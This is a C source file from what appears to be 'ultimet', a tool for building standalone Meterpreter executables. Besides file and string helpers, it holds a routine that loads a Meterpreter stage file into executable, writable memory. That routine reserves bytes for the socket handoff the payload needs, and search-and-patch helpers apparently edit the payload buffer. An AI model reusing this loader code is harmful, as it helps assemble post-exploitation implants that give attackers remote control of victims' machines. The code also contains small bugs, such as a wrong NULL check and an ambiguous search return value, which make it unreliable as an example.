#include "main.h"
DWORD err = 0;

LONGLONG SizeFromName(LPCWSTR szFileName) // Returns a file's size from its filename, returns a LONGLONG, in case you have a LARGE LARGE file :)
{
	LARGE_INTEGER fileSize = {0};
	HANDLE hfile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); //Get a handle on the file

	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		dprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		return -1;
	}

	if(!GetFileSizeEx(hfile,&fileSize)) // Get the size from the file handle
	{
		err = GetLastError();
		dprintf(L"[-] Error getting file size! GetFileSizeEx() returned : %08x\n", err);
		CloseHandle(hfile);
		return -1;
	}

	CloseHandle(hfile); // this will ALWAYS throw an exception if run under a debugger, but good higene if run under "production"
	return fileSize.QuadPart; //LARGE_INTEGER is a sruct, QuadPart is the filesize in a 64bit digit... which should cover all file sizes "That's for files >4GB" 
} 

DWORD CopyStageToBuffer(LPCWSTR szFileName, unsigned char** buffer)
{
	// get file size...
	DWORD size = 0;
	size = (DWORD)SizeFromName(szFileName);
	if (size == -1)
	{
		dprintf(L"[-] Something went wrong getting size of file: \"%s\".\n", szFileName);
		exit(0);
	}
	else {
		dprintf(L"[*] Size of \"%s\" is \"%d\" bytes.\n", szFileName, size);
	}

	// Allocate memory ...
	dprintf(L"[*] Trying to VirtualAlloc \"%d + 5\" bytes of data\n", size);
	*buffer = (unsigned char*)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
	{
		err = GetLastError();
		dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", err);
		return -1;
	}
	dprintf(L"[*] Success! \"%d + 5\" bytes allocated.\n", size);

	// Reading file content into buffer.
	//... first we get a handle on the file
	HANDLE hfile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (hfile==INVALID_HANDLE_VALUE) //if something went wrong ...
	{
		err = GetLastError();
		dprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
		CloseHandle(hfile);
		return -1;
	}
	
	dprintf(L"[*] Copying file \"%s\" to buffer after skipping 5 bytes...\n", szFileName);
	if( FALSE == ReadFile(hfile, *buffer + 5, (DWORD)size, NULL, NULL) )
	{
		printf("[-] Unable to read from file.\n");
		CloseHandle(hfile);
		return -1;
	}
	// We add 5 bytes to leave room for 0xBF+SOCKET_NUMBER
	return ((DWORD)size + 5); 
}

int PatchString(unsigned char* buffer, const wchar_t* replacement, const int index, const int NoOfBytes)
{
	int counter = 0;
	for(int i = index; i < (index + NoOfBytes); i++)
	{
		buffer[i] = replacement[counter];
		counter++;
	}
	return 0;
}

DWORD binstrstr(unsigned char * buff1, int lenbuff1, unsigned char * buff2, int lenbuff2)  // shamelessly ripped from http://forums.devshed.com/c-programming-42/binary-strstr-395935.html , thanks "AlejandroVarela"
{ 
	if (! buff1)                return FALSE; 
	if (! buff2)                return FALSE; 
	if (lenbuff1 == 0)            return FALSE; 
	if (lenbuff2 == 0)            return FALSE; 
	if (lenbuff1 < lenbuff2)            return FALSE; 

	for (int i = 0; i <= (lenbuff1 - lenbuff2); ++ i) 
	{
		if (memcmp(buff1 + i, buff2, lenbuff2-1) == 0)
		{
			return i; 
		}
	}

	return FALSE; 
}  

bool AnsiToUnicode(const char* ascii, wchar_t* unicode)
{
	size_t len = strlen(ascii);
	if(len < 1024)
	{
		int result = MultiByteToWideChar(CP_OEMCP, 0, ascii, -1, unicode, len + 1);
		return TRUE;
	}
	else return FALSE;
}

bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
{
	int result = WideCharToMultiByte(CP_OEMCP, 0, unicode, -1, ascii, 17, 0, 0);
	//int result = MultiByteToWideChar(CP_OEMCP, 0, ascii, -1, unicode, len + 1);
	return TRUE;
}

void print_awesome_header()
{
printf("\n\n****************************************************\n");
printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
printf(" [+] v0.1 pre-alpha\n");
printf("****************************************************\n");
printf("  -  http://eldeeb.net - @SheriefEldeeb\n");
printf("  -  Made in Egypt :)\n");
printf("     ================\n\n");
}